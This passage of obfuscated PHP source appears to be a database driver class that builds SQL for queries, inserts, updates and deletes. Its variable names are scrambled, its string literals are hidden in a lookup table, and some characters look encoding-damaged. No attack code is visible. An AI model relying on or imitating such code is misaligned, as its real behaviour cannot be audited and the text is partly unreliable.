static $ˆ¬—ŞÒ£ = array(); static $¾ˆø¤óß = -1; if (empty($ˆ¬—ŞÒ£)) { foreach ($this->config as $ƒ¦ŒşÈ° => $¥òßÙÇÒ) { $ˆ¬—ŞÒ£[$ƒ¦ŒşÈ°] = explode($Ö¤Ë ¢×[60], $¥òßÙÇÒ); } } if (think_config($Ö¤Ë ¢×[1007])) { if ($’¨³©ôê || think_config($Ö¤Ë ¢×[433]) === !0) { $ •·³ù‹ = floor(mt_rand(0, think_config($Ö¤Ë ¢×[1008]) - 1)); $¾ˆø¤óß = $ •·³ù‹; } else { if (is_numeric(think_config($Ö¤Ë ¢×[1009]))) { $ •·³ù‹ = think_config($Ö¤Ë ¢×[1009]); } else { $ •·³ù‹ = floor(mt_rand(think_config($Ö¤Ë ¢×[1008]), count($ˆ¬—ŞÒ£[$Ö¤Ë ¢×[911]]) - 1)); } } } else { $ •·³ù‹ = floor(mt_rand(0, count($ˆ¬—ŞÒ£[$Ö¤Ë ¢×[911]]) - 1)); $¾ˆø¤óß = $ •·³ù‹; } $ •·³ù‹ = $¾ˆø¤óß !== -1 ? $¾ˆø¤óß : $ •·³ù‹; $Î”»û®ô = array($Ö¤Ë ¢×[913] => isset($ˆ¬—ŞÒ£[$Ö¤Ë ¢×[913]][$ •·³ù‹]) ? $ˆ¬—ŞÒ£[$Ö¤Ë ¢×[913]][$ •·³ù‹] : $ˆ¬—ŞÒ£[$Ö¤Ë ¢×[913]][0], $Ö¤Ë ¢×[914] => isset($ˆ¬—ŞÒ£[$Ö¤Ë ¢×[914]][$ •·³ù‹]) ? $ˆ¬—ŞÒ£[$Ö¤Ë ¢×[914]][$ •·³ù‹] : $ˆ¬—ŞÒ£[$Ö¤Ë ¢×[914]][0], $Ö¤Ë ¢×[911] => isset($ˆ¬—ŞÒ£[$Ö¤Ë ¢×[911]][$ •·³ù‹]) ? $ˆ¬—ŞÒ£[$Ö¤Ë ¢×[911]][$ •·³ù‹] : $ˆ¬—ŞÒ£[$Ö¤Ë ¢×[911]][0], $Ö¤Ë ¢×[912] => isset($ˆ¬—ŞÒ£[$Ö¤Ë ¢×[912]][$ •·³ù‹]) ? $ˆ¬—ŞÒ£[$Ö¤Ë ¢×[912]][$ •·³ù‹] : $ˆ¬—ŞÒ£[$Ö¤Ë ¢×[912]][0], $Ö¤Ë ¢×[31] => isset($ˆ¬—ŞÒ£[$Ö¤Ë ¢×[31]][$ •·³ù‹]) ? $ˆ¬—ŞÒ£[$Ö¤Ë ¢×[31]][$ •·³ù‹] : $ˆ¬—ŞÒ£[$Ö¤Ë ¢×[31]][0], $Ö¤Ë ¢×[941] => isset($ˆ¬—ŞÒ£[$Ö¤Ë ¢×[941]][$ •·³ù‹]) ? $ˆ¬—ŞÒ£[$Ö¤Ë ¢×[941]][$ •·³ù‹] : $ˆ¬—ŞÒ£[$Ö¤Ë ¢×[941]][0], $Ö¤Ë ¢×[27] => isset($ˆ¬—ŞÒ£[$Ö¤Ë ¢×[27]][$ •·³ù‹]) ? $ˆ¬—ŞÒ£[$Ö¤Ë ¢×[27]][$ •·³ù‹] : $ˆ¬—ŞÒ£[$Ö¤Ë ¢×[27]][0]); return $this->connect($Î”»û®ô, $ •·³ù‹); } public function parseDSN($¬˜˜£‰é) { $Ü—¨¶ó =& $_SERVER[ªÏ§Ë·]; if (empty($¬˜˜£‰é)) { return !1; } $™·„Â¨ = parse_url($¬˜˜£‰é); if ($™·„Â¨[$Ü—¨¶ó[191]]) { $¡œ°ŸÁƒ = array($Ü—¨¶ó[986] => $™·„Â¨[$Ü—¨¶ó[191]], $Ü—¨¶ó[913] => isset($™·„Â¨[$Ü—¨¶ó[628]]) ? $™·„Â¨[$Ü—¨¶ó[628]] : $Ü—¨¶ó[12], $Ü—¨¶ó[914] => isset($™·„Â¨[$Ü—¨¶ó[1010]]) ? $™·„Â¨[$Ü—¨¶ó[1010]] : $Ü—¨¶ó[12], $Ü—¨¶ó[911] => isset($™·„Â¨[$Ü—¨¶ó[192]]) ? $™·„Â¨[$Ü—¨¶ó[192]] : $Ü—¨¶ó[12], $Ü—¨¶ó[912] => isset($™·„Â¨[$Ü—¨¶ó[193]]) ? $™·„Â¨[$Ü—¨¶ó[193]] : $Ü—¨¶ó[12], $Ü—¨¶ó[31] => isset($™·„Â¨[$Ü—¨¶ó[94]]) ? substr($™·„Â¨[$Ü—¨¶ó[94]], 1) : $Ü—¨¶ó[12]); } else { preg_match($Ü—¨¶ó[1011], trim($¬˜˜£‰é), $ÕƒÜ»§ó); $¡œ°ŸÁƒ = array($Ü—¨¶ó[986] => $ÕƒÜ»§ó[1], $Ü—¨¶ó[913] => $ÕƒÜ»§ó[2], $Ü—¨¶ó[914] => $ÕƒÜ»§ó[3], $Ü—¨¶ó[911] => $ÕƒÜ»§ó[4], $Ü—¨¶ó[912] => $ÕƒÜ»§ó[5], $Ü—¨¶ó[31] => $ÕƒÜ»§ó[6]); } $¡œ°ŸÁƒ[$Ü—¨¶ó[941]] = $Ü—¨¶ó[12]; return $¡œ°ŸÁƒ; } protected function debug() { $ëÛ·®°Û =& $_SERVER[ªÏ§Ë·]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ëÛ·®°Û[1012]; if (think_config($ëÛ·®°Û[1013])) { think_status($ëÛ·®°Û[1014]); think_trace($this->queryStr . $ëÛ·®°Û[1015] . think_status($ëÛ·®°Û[34], $ëÛ·®°Û[1014], 6) . $ëÛ·®°Û[1016], $ëÛ·®°Û[12], $ëÛ·®°Û[1017]); } } protected function parseLock($ôà§æ´ = false) { $ñİ¡©·í =& $_SERVER[ªÏ§Ë·]; if (!$ôà§æ´) { return $ñİ¡©·í[12]; } if ($ñİ¡©·í[943] == $this->dbType) { return $ñİ¡©·í[1018]; } return $ñİ¡©·í[1019]; } protected function parseSet($Â™½¾ú›) { $ñüºŸÅ =& $_SERVER[ªÏ§Ë·]; foreach ($Â™½¾ú› as $öë†Ü©¹ => $ÁºÛ«÷ø) { if (is_array($ÁºÛ«÷ø) && $ñüºŸÅ[335] == $ÁºÛ«÷ø[0]) { $Óá±æ¡[] = $this->parseKey($öë†Ü©¹) . $ñüºŸÅ[909] . $ÁºÛ«÷ø[1]; } elseif (is_scalar($ÁºÛ«÷ø) || is_null($ÁºÛ«÷ø)) { $Óá±æ¡[] = $this->parseKey($öë†Ü©¹) . $ñüºŸÅ[909] . $this->parseValue($ÁºÛ«÷ø); } } return $ñüºŸÅ[1020] . implode($ñüºŸÅ[60], $Óá±æ¡); } protected function bindParam($´ëˆôí“, $ûµíáé) { $this->bind[$_SERVER[ªÏ§Ë·][4] . $´ëˆôí“] = $ûµíáé; } protected function parseBind($Ï’‚¼âó) { $Ï’‚¼âó = array_merge($this->bind, $Ï’‚¼âó); $this->bind = array(); return $Ï’‚¼âó; } function parseKey(&$Í‰°ß, $ªÀÔØ´é = true) { if ($ªÀÔØ´é) { $Í‰°ß = $this->parseKeyCheck($Í‰°ß); } return $Í‰°ß; } function parseKeyCheck($ÓÕ½Ç—Í) { $±òÒ™Ç =& $_SERVER[ªÏ§Ë·]; $ÓÕ½Ç—Í = trim($ÓÕ½Ç—Í); if (!preg_match($±òÒ™Ç[1021], $ÓÕ½Ç—Í)) { think_exception($±òÒ™Ç[1022] . $ÓÕ½Ç—Í); } return $ÓÕ½Ç—Í; } protected function parseValue($Ö—ßÆï½) { $­äÅÃŞâ =& $_SERVER[ªÏ§Ë·]; if (is_string($Ö—ßÆï½)) { $Ö—ßÆï½ = $­äÅÃŞâ[982] . $this->escapeString($Ö—ßÆï½) . $­äÅÃŞâ[982]; } elseif (isset($Ö—ßÆï½[0]) && is_string($Ö—ßÆï½[0]) && strtolower($Ö—ßÆï½[0]) == $­äÅÃŞâ[335]) { $Ö—ßÆï½ = $this->escapeString($Ö—ßÆï½[1]); } elseif (is_array($Ö—ßÆï½)) { $Ö—ßÆï½ = array_map(array($this, $­äÅÃŞâ[983]), $Ö—ßÆï½); } elseif (is_bool($Ö—ßÆï½)) { $Ö—ßÆï½ = $Ö—ßÆï½ ? $­äÅÃŞâ[98] : $­äÅÃŞâ[208]; } elseif (is_null($Ö—ßÆï½)) { $Ö—ßÆï½ = $­äÅÃŞâ[113]; } return $Ö—ßÆï½; } protected function parseField($ã¸¼õÃ) { $Ø‚Œ÷ =& $_SERVER[ªÏ§Ë·]; if (is_string($ã¸¼õÃ) && strpos($ã¸¼õÃ, $Ø‚Œ÷[60])) { $ã¸¼õÃ = explode($Ø‚Œ÷[60], $ã¸¼õÃ); } if (is_array($ã¸¼õÃ)) { $„¶Éõôë = array(); foreach ($ã¸¼õÃ as $²æ÷ôŞ => $ŸªÍ¦¬Ñ) { if (!is_numeric($²æ÷ôŞ)) { $„¶Éõôë[] = $this->parseKey($²æ÷ôŞ, !1) . $Ø‚Œ÷[1023] . $this->parseKey($ŸªÍ¦¬Ñ); } else { $„¶Éõôë[] = $this->parseKey($ŸªÍ¦¬Ñ); } } $Ä²Ö±Û° = implode($Ø‚Œ÷[60], $„¶Éõôë); } elseif (is_string($ã¸¼õÃ) && !empty($ã¸¼õÃ)) { $Ä²Ö±Û° = $ã¸¼õÃ; } else { $Ä²Ö±Û° = $Ø‚Œ÷[199]; } return $Ä²Ö±Û°; } protected function parseTable($­ï¥ûØñ) { $¦¸é‹— =& $_SERVER[ªÏ§Ë·]; if (is_array($­ï¥ûØñ)) { $¤€ş›ñæ = array(); foreach ($­ï¥ûØñ as $Ã·à›æò => $è”…³ô») { if (!is_numeric($Ã·à›æò)) { $¤€ş›ñæ[] = $this->parseKey($Ã·à›æò) . $¦¸é‹—[63] . $this->parseKey($è”…³ô»); } else { $¤€ş›ñæ[] = $this->parseKey($Ã·à›æò); } } $­ï¥ûØñ = $¤€ş›ñæ; } elseif (is_string($­ï¥ûØñ)) { if (strstr($­ï¥ûØñ, $¦¸é‹—[63])) { return $­ï¥ûØñ; } $­ï¥ûØñ = explode($¦¸é‹—[60], $­ï¥ûØñ); array_walk($­ï¥ûØñ, array($this, $¦¸é‹—[931])); } return $¦¸é‹—[925] . trim(implode($¦¸é‹—[1024], $­ï¥ûØñ), $¦¸é‹—[423]) . $¦¸é‹—[925]; } protected function parseWhere($¥áÈÆÜö) { $óÓ”ÂÅ =& $_SERVER[ªÏ§Ë·]; $½§ûÊˆ¶ = $óÓ”ÂÅ[12]; if (is_string($¥áÈÆÜö)) { $½§ûÊˆ¶ = $¥áÈÆÜö; } else { $ëñÆ© = isset($¥áÈÆÜö[$óÓ”ÂÅ[1025]]) ? strtoupper($¥áÈÆÜö[$óÓ”ÂÅ[1025]]) : $óÓ”ÂÅ[12]; if (in_array($ëñÆ©, array($óÓ”ÂÅ[1026], $óÓ”ÂÅ[1027], $óÓ”ÂÅ[1028]))) { $ëñÆ© = $óÓ”ÂÅ[63] . $ëñÆ© . $óÓ”ÂÅ[63]; unset($¥áÈÆÜö[$óÓ”ÂÅ[1025]]); } else { $ëñÆ© = $óÓ”ÂÅ[1029]; } foreach ($¥áÈÆÜö as $—‡ãÈúó => $Ó©ÑÈê¡) { $½§ûÊˆ¶ .= $óÓ”ÂÅ[315]; if (is_numeric($—‡ãÈúó)) { $—‡ãÈúó = $óÓ”ÂÅ[1030]; } if (0 === strpos($—‡ãÈúó, $óÓ”ÂÅ[11])) { $½§ûÊˆ¶ .= $this->parseThinkWhere($—‡ãÈúó, $Ó©ÑÈê¡); } else { if (!preg_match($óÓ”ÂÅ[1031], trim($—‡ãÈúó))) { think_exception(think_lang($óÓ”ÂÅ[1032]) . $óÓ”ÂÅ[4] . $—‡ãÈúó); } $Ë¡Ôªˆç = is_array($Ó©ÑÈê¡) && isset($Ó©ÑÈê¡[$óÓ”ÂÅ[1033]]); $—‡ãÈúó = trim($—‡ãÈúó); if (strpos($—‡ãÈúó, $óÓ”ÂÅ[321])) { $¨å¾ûà = explode($óÓ”ÂÅ[321], $—‡ãÈúó); $€ğºÄ‹ó = array(); foreach ($¨å¾ûà as $ÃÇÉ‡Ñº => $–·ù…û ) { $¥”¦«È„ = $Ë¡Ôªˆç ? $Ó©ÑÈê¡[$ÃÇÉ‡Ñº] : $Ó©ÑÈê¡; $€ğºÄ‹ó[] = $óÓ”ÂÅ[298] . $this->parseWhereItem($this->parseKey($–·ù…û ), $¥”¦«È„) . $óÓ”ÂÅ[930]; } $½§ûÊˆ¶ .= implode($óÓ”ÂÅ[1034], $€ğºÄ‹ó); } elseif (strpos($—‡ãÈúó, $óÓ”ÂÅ[322])) { $¨å¾ûà = explode($óÓ”ÂÅ[322], $—‡ãÈúó); $€ğºÄ‹ó = array(); foreach ($¨å¾ûà as $ÃÇÉ‡Ñº => $–·ù…û ) { $¥”¦«È„ = $Ë¡Ôªˆç ? $Ó©ÑÈê¡[$ÃÇÉ‡Ñº] : $Ó©ÑÈê¡; $€ğºÄ‹ó[] = $óÓ”ÂÅ[298] . $this->parseWhereItem($this->parseKey($–·ù…û ), $¥”¦«È„) . $óÓ”ÂÅ[930]; } $½§ûÊˆ¶ .= implode($óÓ”ÂÅ[1029], $€ğºÄ‹ó); } else { $½§ûÊˆ¶ .= $this->parseWhereItem($this->parseKey($—‡ãÈúó), $Ó©ÑÈê¡); } } $½§ûÊˆ¶ .= $óÓ”ÂÅ[316] . $ëñÆ©; } $½§ûÊˆ¶ = substr($½§ûÊˆ¶, 0, -strlen($ëñÆ©)); } return empty($½§ûÊˆ¶) ? $óÓ”ÂÅ[12] : $óÓ”ÂÅ[1035] . $½§ûÊˆ¶; } protected function parseWhereItem($°Ş§“Ù‘, $ñ«çü©) { $‰Õâªœ£ =& $_SERVER[ªÏ§Ë·]; $×ªªÖç = $‰Õâªœ£[12]; if (is_array($ñ«çü©)) { if (is_string($ñ«çü©[0])) { $Îè™Ãğ = strtolower($ñ«çü©[0]); if (in_array($ñ«çü©[0], array($‰Õâªœ£[909], $‰Õâªœ£[1036], $‰Õâªœ£[1037], $‰Õâªœ£[1038], $‰Õâªœ£[1039], $‰Õâªœ£[1040]))) { $×ªªÖç .= $°Ş§“Ù‘ . $‰Õâªœ£[63] . $ñ«çü©[0] . $‰Õâªœ£[63] . $this->parseValue($ñ«çü©[1]); } elseif (preg_match($‰Õâªœ£[1041], $ñ«çü©[0])) { $×ªªÖç .= $°Ş§“Ù‘ . $‰Õâªœ£[63] . $this->exp[$Îè™Ãğ] . $‰Õâªœ£[63] . $this->parseValue($ñ«çü©[1]); } elseif (preg_match($‰Õâªœ£[1042], $ñ«çü©[0])) { if (is_array($ñ«çü©[1])) { $¢ŠÓ×«£ = isset($ñ«çü©[2]) ? strtoupper($ñ«çü©[2]) : $‰Õâªœ£[1027]; if (in_array($¢ŠÓ×«£, array($‰Õâªœ£[1026], $‰Õâªœ£[1027], $‰Õâªœ£[1028]))) { $ÅÇèî™Ë = array(); foreach ($ñ«çü©[1] as $Ÿ¤»æù¦) { $ÅÇèî™Ë[] = $°Ş§“Ù‘ . $‰Õâªœ£[63] . $this->exp[$Îè™Ãğ] . $‰Õâªœ£[63] . $this->parseValue($Ÿ¤»æù¦); } $×ªªÖç .= $‰Õâªœ£[298] . implode($‰Õâªœ£[63] . $¢ŠÓ×«£ . $‰Õâªœ£[63], $ÅÇèî™Ë) . $‰Õâªœ£[930]; } } else { $×ªªÖç .= $°Ş§“Ù‘ . $‰Õâªœ£[63] . $this->exp[$Îè™Ãğ] . $‰Õâªœ£[63] . $this->parseValue($ñ«çü©[1]); } } elseif ($‰Õâªœ£[335] == $Îè™Ãğ) { $×ªªÖç .= $‰Õâªœ£[928] . $°Ş§“Ù‘ . $‰Õâªœ£[63] . $ñ«çü©[1] . $‰Õâªœ£[1043]; } elseif (preg_match($‰Õâªœ£[1044], $ñ«çü©[0])) { $×ªªÖç .= $ñ«çü©[0]; } elseif (preg_match($‰Õâªœ£[1045], $ñ«çü©[0])) { if (isset($ñ«çü©[2]) && $‰Õâªœ£[335] == $ñ«çü©[2]) { $×ªªÖç .= $°Ş§“Ù‘ . $‰Õâªœ£[63] . $this->exp[$Îè™Ãğ] . $‰Õâªœ£[63] . $ñ«çü©[1]; } else { if (is_string($ñ«çü©[1])) { $ñ«çü©[1] = explode($‰Õâªœ£[60], $ñ«çü©[1]); } $¢°×Û¿æ = implode($‰Õâªœ£[60], $this->parseValue($ñ«çü©[1])); $×ªªÖç .= $°Ş§“Ù‘ . $‰Õâªœ£[63] . $this->exp[$Îè™Ãğ] . $‰Õâªœ£[928] . $¢°×Û¿æ . $‰Õâªœ£[930]; } } elseif (preg_match($‰Õâªœ£[1046], $ñ«çü©[0])) { $ÛÏ ßÁ = is_string($ñ«çü©[1]) ? explode($‰Õâªœ£[60], $ñ«çü©[1]) : $ñ«çü©[1]; $×ªªÖç .= $‰Õâªœ£[928] . $°Ş§“Ù‘ . $‰Õâªœ£[63] . $this->exp[$Îè™Ãğ] . $‰Õâªœ£[63] . $this->parseValue($ÛÏ ßÁ[0]) . $‰Õâªœ£[1029] . $this->parseValue($ÛÏ ßÁ[1]) . $‰Õâªœ£[316]; } else { think_exception(think_lang($‰Õâªœ£[1032]) . $‰Õâªœ£[4] . $ñ«çü©[0]); } } else { $ÚêŞ¶ù = count($ñ«çü©); $÷¹“ñÂ¬ = $‰Õâªœ£[12]; if (is_string($ñ«çü©[$ÚêŞ¶ù - 1])) { $÷¹“ñÂ¬ = isset($ñ«çü©[$ÚêŞ¶ù - 1]) ? strtoupper($ñ«çü©[$ÚêŞ¶ù - 1]) : $‰Õâªœ£[12]; if (in_array($÷¹“ñÂ¬, array($‰Õâªœ£[1026], $‰Õâªœ£[1027], $‰Õâªœ£[1028]))) { $ÚêŞ¶ù = $ÚêŞ¶ù - 1; } } else { $÷¹“ñÂ¬ = $‰Õâªœ£[1026]; } for ($¸ïæÖÆª = 0; $¸ïæÖÆª < $ÚêŞ¶ù; $¸ïæÖÆª++) { $ÛÏ ßÁ = is_array($ñ«çü©[$¸ïæÖÆª]) ? $ñ«çü©[$¸ïæÖÆª][1] : $ñ«çü©[$¸ïæÖÆª]; if ($‰Õâªœ£[335] == strtolower($ñ«çü©[$¸ïæÖÆª][0])) { $×ªªÖç .= $‰Õâªœ£[298] . $°Ş§“Ù‘ . $‰Õâªœ£[63] . $ÛÏ ßÁ . $‰Õâªœ£[1043] . $÷¹“ñÂ¬ . $‰Õâªœ£[63]; } else { $á¤µó–· = is_array($ñ«çü©[$¸ïæÖÆª]) ? $this->exp[strtolower($ñ«çü©[$¸ïæÖÆª][0])] : $‰Õâªœ£[909]; if (!$á¤µó–· && is_array($ñ«çü©[$¸ïæÖÆª]) && in_array($ñ«çü©[$¸ïæÖÆª][0], array($‰Õâªœ£[909], $‰Õâªœ£[1036], $‰Õâªœ£[1037], $‰Õâªœ£[1038], $‰Õâªœ£[1039], $‰Õâªœ£[1040]))) { $á¤µó–· = $ñ«çü©[$¸ïæÖÆª][0]; } $×ªªÖç .= $‰Õâªœ£[298] . $°Ş§“Ù‘ . $‰Õâªœ£[63] . $á¤µó–· . $‰Õâªœ£[63] . $this->parseValue($ÛÏ ßÁ) . $‰Õâªœ£[1043] . $÷¹“ñÂ¬ . $‰Õâªœ£[63]; } } $×ªªÖç = substr($×ªªÖç, 0, -4); } } else { $×ªªÖç .= $°Ş§“Ù‘ . $‰Õâªœ£[1047] . $this->parseValue($ñ«çü©); } return $×ªªÖç; } protected function parseThinkWhere($Æ¨ÌÎà, $ğµµÚ) { $¡ÊÇûÎÓ =& $_SERVER[ªÏ§Ë·]; $™çôğ’ = $¡ÊÇûÎÓ[12]; switch ($Æ¨ÌÎà) { case $¡ÊÇûÎÓ[390]: $™çôğ’ = $ğµµÚ; break; case $¡ÊÇûÎÓ[1030]: $™çôğ’ = is_string($ğµµÚ) ? $ğµµÚ : substr($this->parseWhere($ğµµÚ), 6); break; case $¡ÊÇûÎÓ[1048]: parse_str($ğµµÚ, $î‚€ßó›); if (isset($î‚€ßó›[$¡ÊÇûÎÓ[1025]])) { $£ŸáÅ¨é = $¡ÊÇûÎÓ[63] . strtoupper($î‚€ßó›[$¡ÊÇûÎÓ[1025]]) . $¡ÊÇûÎÓ[63]; unset($î‚€ßó›[$¡ÊÇûÎÓ[1025]]); } else { $£ŸáÅ¨é = $¡ÊÇûÎÓ[1029]; } $›”·Š‡è = array(); foreach ($î‚€ßó› as $³’³Øõ× => $Ô´‹×çı) { $›”·Š‡è[] = $this->parseKey($³’³Øõ×) . $¡ÊÇûÎÓ[1047] . $this->parseValue($Ô´‹×çı); } $™çôğ’ = implode($£ŸáÅ¨é, $›”·Š‡è); break; } return $™çôğ’; } protected function parseLimit($˜Åè…ƒœ) { $­³ıÖ€ =& $_SERVER[ªÏ§Ë·]; return !empty($˜Åè…ƒœ) ? $­³ıÖ€[61] . $˜Åè…ƒœ . $­³ıÖ€[63] : $­³ıÖ€[12]; } protected function parseJoin($´Õ½ı¹²) { $ó¤­ß„ç =& $_SERVER[ªÏ§Ë·]; $Ü’Ù™ = $ó¤­ß„ç[12]; if (!empty($´Õ½ı¹²)) { if (is_array($´Õ½ı¹²)) { foreach ($´Õ½ı¹² as $‰à¼íı° => $ÔªÜ™Ç) { if (!1 !== stripos($ÔªÜ™Ç, $ó¤­ß„ç[1049])) { $Ü’Ù™ .= $ó¤­ß„ç[63] . $ÔªÜ™Ç; } else { $Ü’Ù™ .= $ó¤­ß„ç[1050] . $ÔªÜ™Ç; } } } else { $Ü’Ù™ .= $ó¤­ß„ç[1050] . $´Õ½ı¹²; } } $Ü’Ù™ = preg_replace($ó¤­ß„ç[1051], think_config($ó¤­ß„ç[955]) . $ó¤­ß„ç[1052], $Ü’Ù™); return $Ü’Ù™; } protected function parseOrder($¬ô˜†È€) { $ûÜû‘Ó® =& $_SERVER[ªÏ§Ë·]; if (is_array($¬ô˜†È€)) { $½£àı Ê = array(); foreach ($¬ô˜†È€ as $»Ô†…üô => $Ò•óáÊ„) { if (is_numeric($»Ô†…üô)) { $½£àı Ê[] = $this->parseKey($Ò•óáÊ„); } else { $Ò•óáÊ„ = in_array(strtoupper(trim($Ò•óáÊ„)), array($ûÜû‘Ó®[1053], $ûÜû‘Ó®[1054])) ? $ûÜû‘Ó®[63] . $Ò•óáÊ„ : $ûÜû‘Ó®[12]; if (preg_match($ûÜû‘Ó®[1055], $»Ô†…üô)) { $½£àı Ê[] = $this->parseKey($»Ô†…üô) . $Ò•óáÊ„; } else { think_exception($ûÜû‘Ó®[1056] . $»Ô†…üô); } } } $¬ô˜†È€ = implode($ûÜû‘Ó®[60], $½£àı Ê); } return !empty($¬ô˜†È€) ? $ûÜû‘Ó®[1057] . $¬ô˜†È€ : $ûÜû‘Ó®[12]; } protected function parseGroup($—ëı£„) { $¹Üİİ± =& $_SERVER[ªÏ§Ë·]; return !empty($—ëı£„) ? $¹Üİİ±[1058] . $—ëı£„ : $¹Üİİ±[12]; } protected function parseHaving($£µİ­–) { $ïÆÖå—Ô =& $_SERVER[ªÏ§Ë·]; return !empty($£µİ­–) ? $ïÆÖå—Ô[1059] . $£µİ­– : $ïÆÖå—Ô[12]; } protected function parseComment($’ËüÆÚè) { $Ş°Ì‘™Ò =& $_SERVER[ªÏ§Ë·]; return !empty($’ËüÆÚè) ? $Ş°Ì‘™Ò[1060] . $’ËüÆÚè . $Ş°Ì‘™Ò[1061] : $Ş°Ì‘™Ò[12]; } protected function parseDistinct($ªÖ… öí) { $‡®«úÜè =& $_SERVER[ªÏ§Ë·]; return !empty($ªÖ… öí) ? $‡®«úÜè[1062] : $‡®«úÜè[12]; } protected function parseUnion($€ëÇÉ²) { $şšîÚ§× =& $_SERVER[ªÏ§Ë·]; if (empty($€ëÇÉ²)) { return $şšîÚ§×[12]; } if (isset($€ëÇÉ²[$şšîÚ§×[386]])) { $Şú×¾ö„ = $şšîÚ§×[1063]; unset($€ëÇÉ²[$şšîÚ§×[386]]); } else { $Şú×¾ö„ = $şšîÚ§×[1064]; } foreach ($€ëÇÉ² as $Ì ¼Ô²Ú) { $î×¡Šâ[] = $Şú×¾ö„ . (is_array($Ì ¼Ô²Ú) ? $this->buildSelectSql($Ì ¼Ô²Ú) : $Ì ¼Ô²Ú); } return implode($şšîÚ§×[63], $î×¡Šâ); } public function insert($óì´¡à×, $Ìò„Ò†¶ = array(), $·¶©ÔŞ = false) { $²ÈÅ± =& $_SERVER[ªÏ§Ë·]; $è«Ø¡ûş = $Â‰ø˜™í = array(); $this->model = $Ìò„Ò†¶[$²ÈÅ±[319]]; foreach ($óì´¡à× as $·¯»‹ù => $è÷ˆñ“™) { if (is_array($è÷ˆñ“™) && $²ÈÅ±[335] == $è÷ˆñ“™[0]) { $Â‰ø˜™í[] = $this->parseKey($·¯»‹ù); $è«Ø¡ûş[] = $è÷ˆñ“™[1]; } elseif (is_scalar($è÷ˆñ“™) || is_null($è÷ˆñ“™)) { $Â‰ø˜™í[] = $this->parseKey($·¯»‹ù); $è«Ø¡ûş[] = $this->parseValue($è÷ˆñ“™); } } $ì¦¯¶Á = ($·¶©ÔŞ ? $²ÈÅ±[932] : $²ÈÅ±[933]) . $²ÈÅ±[934] . $this->parseTable($Ìò„Ò†¶[$²ÈÅ±[317]]) . $²ÈÅ±[928] . implode($²ÈÅ±[60], $Â‰ø˜™í) . $²ÈÅ±[929] . implode($²ÈÅ±[60], $è«Ø¡ûş) . $²ÈÅ±[930]; $ì¦¯¶Á .= $this->parseLock(isset($Ìò„Ò†¶[$²ÈÅ±[871]]) ? $Ìò„Ò†¶[$²ÈÅ±[871]] : !1); $ì¦¯¶Á .= $this->parseComment(!empty($Ìò„Ò†¶[$²ÈÅ±[392]]) ? $Ìò„Ò†¶[$²ÈÅ±[392]] : $²ÈÅ±[12]); return $this->execute($ì¦¯¶Á, $this->parseBind(!empty($Ìò„Ò†¶[$²ÈÅ±[323]]) ? $Ìò„Ò†¶[$²ÈÅ±[323]] : array())); } public function selectInsert($ÏƒÏç½´, $È˜è¶Š, $ç„ØôˆÖ = array()) { $ŠÃ°§ =& $_SERVER[ªÏ§Ë·]; $this->model = $ç„ØôˆÖ[$ŠÃ°§[319]]; if (is_string($ÏƒÏç½´)) { $ÏƒÏç½´ = explode($ŠÃ°§[60], $ÏƒÏç½´); } array_walk($ÏƒÏç½´, array($this, $ŠÃ°§[931])); $²ÏĞõùá = $ŠÃ°§[1065] . $this->parseTable($È˜è¶Š) . $ŠÃ°§[928] . implode($ŠÃ°§[60], $ÏƒÏç½´) . $ŠÃ°§[1043]; $²ÏĞõùá .= $this->buildSelectSql($ç„ØôˆÖ); return $this->execute($²ÏĞõùá, $this->parseBind(!empty($ç„ØôˆÖ[$ŠÃ°§[323]]) ? $ç„ØôˆÖ[$ŠÃ°§[323]] : array())); } public function update($Àş¨¦ä, $ìîß¹–) { $¿ÆøÎÁÔ =& $_SERVER[ªÏ§Ë·]; $this->model = $ìîß¹–[$¿ÆøÎÁÔ[319]]; $¨º×»Éó = $¿ÆøÎÁÔ[1066] . $this->parseTable($ìîß¹–[$¿ÆøÎÁÔ[317]]) . $this->parseSet($Àş¨¦ä) . $this->parseWhere(!empty($ìîß¹–[$¿ÆøÎÁÔ[313]]) ? $ìîß¹–[$¿ÆøÎÁÔ[313]] : $¿ÆøÎÁÔ[12]) . $this->parseOrder(!empty($ìîß¹–[$¿ÆøÎÁÔ[403]]) ? $ìîß¹–[$¿ÆøÎÁÔ[403]] : $¿ÆøÎÁÔ[12]) . $this->parseLimit(!empty($ìîß¹–[$¿ÆøÎÁÔ[330]]) ? $ìîß¹–[$¿ÆøÎÁÔ[330]] : $¿ÆøÎÁÔ[12]) . $this->parseLock(isset($ìîß¹–[$¿ÆøÎÁÔ[871]]) ? $ìîß¹–[$¿ÆøÎÁÔ[871]] : !1) . $this->parseComment(!empty($ìîß¹–[$¿ÆøÎÁÔ[392]]) ? $ìîß¹–[$¿ÆøÎÁÔ[392]] : $¿ÆøÎÁÔ[12]); return $this->execute($¨º×»Éó, $this->parseBind(!empty($ìîß¹–[$¿ÆøÎÁÔ[323]]) ? $ìîß¹–[$¿ÆøÎÁÔ[323]] : array())); } public function delete($Ï–ğ¿€´ = array()) { $â¬»ÔÑæ =& $_SERVER[ªÏ§Ë·]; $this->model = $Ï–ğ¿€´[$â¬»ÔÑæ[319]]; $½ì»¯€À = $â¬»ÔÑæ[1067] . $this->parseTable($Ï–ğ¿€´[$â¬»ÔÑæ[317]]) . $this->parseWhere(!empty($Ï–ğ¿€´[$â¬»ÔÑæ[313]]) ? $Ï–ğ¿€´[$â¬»ÔÑæ[313]] : $â¬»ÔÑæ[12]) . $this->parseOrder(!empty($Ï–ğ¿€´[$â¬»ÔÑæ[403]]) ? $Ï–ğ¿€´[$â¬»ÔÑæ[403]] : $â¬»ÔÑæ[12]) . $this->parseLimit(!empty($Ï–ğ¿€´[$â¬»ÔÑæ[330]]) ? $Ï–ğ¿€´[$â¬»ÔÑæ[330]] : $â¬»ÔÑæ[12]) . $this->parseLock(isset($Ï–ğ¿€´[$â¬»ÔÑæ[871]]) ? $Ï–ğ¿€´[$â¬»ÔÑæ[871]] : !1) . $this->parseComment(!empty($Ï–ğ¿€´[$â¬»ÔÑæ[392]]) ? $Ï–ğ¿€´[$â¬»ÔÑæ[392]] : $â¬»ÔÑæ[12]); return $this->execute($½ì»¯€À, $this->parseBind(!empty($Ï–ğ¿€´[$â¬»ÔÑæ[323]]) ? $Ï–ğ¿€´[$â¬»ÔÑæ[323]] : array())); } public function select($Ÿ‚·Õ¦Ì = array()) { $¤ºÌÊóà =& $_SERVER[ªÏ§Ë·]; $this->model = $Ÿ‚·Õ¦Ì[$¤ºÌÊóà[319]]; $ãÜ€õ¿ì = $this->buildSelectSql($Ÿ‚·Õ¦Ì); 